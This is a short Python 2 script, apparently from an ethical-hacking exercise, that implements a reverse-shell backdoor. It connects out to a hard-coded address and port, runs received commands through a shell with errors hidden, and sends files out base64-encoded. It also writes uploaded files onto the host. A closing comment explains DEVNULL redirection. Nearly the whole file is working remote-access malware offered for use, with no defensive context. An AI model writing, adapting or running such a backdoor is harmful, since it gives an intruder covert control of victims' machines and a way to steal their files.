#!/usr/bin/env python
import socket, subprocess, json, os, base64, sys
from colorama import init, Fore		# for fancy/colorful display

class Backdoor:
	def __init__(self, ip, port):
		self.color()
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((ip, port))

	def color(self):
		# initialize colorama
		init()
		# define colors
		self.RED = Fore.RED
		self.Yellow = Fore.YELLOW
		self.RESET = Fore.RESET

	def execute_system_commands(self, cmd):
		DEVNULL = open(os.devnull, 'wb')	#location to redirect standard errors & inputs
		return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.s.send(json_data)

	def reliable_recieve(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.s.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def change_directory_to(self, path):
		os.chdir(path)
		return '\n[+] Changing working directory to ' + str(path) + '\n'

	def read_file(self, path):
		with open(path, 'rb') as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, 'wb') as file:
			file.write(base64.b64decode(content))
			return '\n{}[+] Upload Successful{}\n'.format(self.Yellow, self.RESET)

	def run(self):
		while True:
			command = self.reliable_recieve()
			try:
				if command[0] == 'exit':
					self.s.close()
					sys.exit()
				elif command[0] == 'clear':
					os.system('cls')
				elif command[0] == 'cd' and len(command) > 1:
					command_result = self.change_directory_to(command[1])
				elif command[0] == 'download':
					command_result = self.read_file(command[1])
				elif command[0] == 'upload':
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_commands(command)
			except Exception:
				command_result = '\n{}[-] Error During Command Execution {}\n'.format(self.RED, self.RESET)

			self.reliable_send(command_result)
		self.s.close()


#============================
my_backdoor = Backdoor('192.168.0.105', 4446)
my_backdoor.run()

#=============================
'''
"sys.exit" is the best way of exiting.

In python 3, you can simply redirect the stderr, stdin and stdout by DEVNULL as:
"stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL" and so on...

In python 2, to redirect the standard errors, inputs and outputs, we first have to make 
the location for DEVNULL as:
DEVNULL = open(os.devnull, 'wb')	--> os.devnull refers to any OS

'''